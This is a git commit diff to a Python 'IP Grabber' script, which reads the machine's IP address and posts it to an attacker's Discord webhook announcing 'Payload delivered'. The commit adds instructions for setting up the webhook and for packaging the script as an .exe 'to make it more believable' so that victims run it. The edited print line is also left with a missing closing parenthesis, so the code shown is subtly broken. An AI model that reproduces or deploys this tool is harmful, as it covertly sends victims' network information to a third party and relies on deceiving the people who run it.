c2acf46568cb0ae499f4ee0c374e4a412ebf4edc
MrEpitome <99032465+MrEpitome@users.noreply.github.com>
2022-02-05 00:01:32 +0800

    Clearer instructions
    Self-explanatory.

--- IP Grabber.py
+++ IP Grabber.py
@@ -4,7 +4,8 @@ import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
 
-url = "Your Webhook Here" 
+url = "Your Webhook URL Here" 
+#How to create a Discord Webhook URL: Server Settings >> Integration >> Webhooks >> New Webhook >> Copy the URL
 data = {
     "content" : "IP Grabbed Successfully",
     "username" : "Mr. IP Grabber"
@@ -25,5 +26,7 @@ try:
 except requests.exceptions.HTTPError as err:
     print(err)
 else:
-    print("Payload delivered successfully, code {}.".format(result.status_code))
+    print("Payload delivered successfully, code {}.".format(result.status_code)
+#Convert this into a .exe to make it more believable with pyinstaller
+#Add Python to path >> Open CMD >> pip install pyinstaller >> cd the_directory_of_the_ip_grabber >> pyinstaller --onefile "IP Grabber.py" >> Open the directory >> open dist >> The .exe should be there
 
